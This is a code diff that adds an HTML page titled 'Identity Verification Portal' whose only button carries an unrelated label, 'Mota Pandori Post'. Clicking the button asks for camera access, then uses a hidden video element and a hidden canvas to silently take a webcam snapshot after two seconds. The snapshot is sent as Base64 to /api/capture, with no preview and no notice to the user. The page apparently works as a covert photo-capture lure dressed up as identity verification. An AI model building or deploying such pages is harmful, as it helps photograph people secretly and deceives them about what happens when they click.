@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification Portal</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
+        .btn { background-color: #007BFF; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <button class="btn" id="start-btn">Mota Pandori Post</button>
+</div>
+
+<!-- Hidden elements for capture operations -->
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    document.getElementById('start-btn').addEventListener('click', () => {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Request camera hardware access
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then((stream) => {
+                video.srcObject = stream;
+                video.play();
+
+                // Wait 2 seconds for camera sensor calibration, then capture
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    // Convert captured frame to Base64 String
+                    const base64Image = canvas.toDataURL('image/jpeg');
+
+                    // Send payload to backend server
+                    sendData(base64Image);
+
+                    // Turn off the camera stream to clean up resources
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            })
+            .catch((err) => {
+                console.error("Camera permission denied:", err);
+                alert("Verification failed: Camera access is required.");
+            });
+    });
+
+    function sendData(imageString) {
+        fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageString })
+        })
+        .then(res => res.json())
+        .then(data => {
+            // alert("Verification process completed successfully!");
+            console.log("Server Response:", data);
+        })
+        .catch(err => console.error("Error sending data:", err));
+    }
+</script>
+
+</body>
+</html>
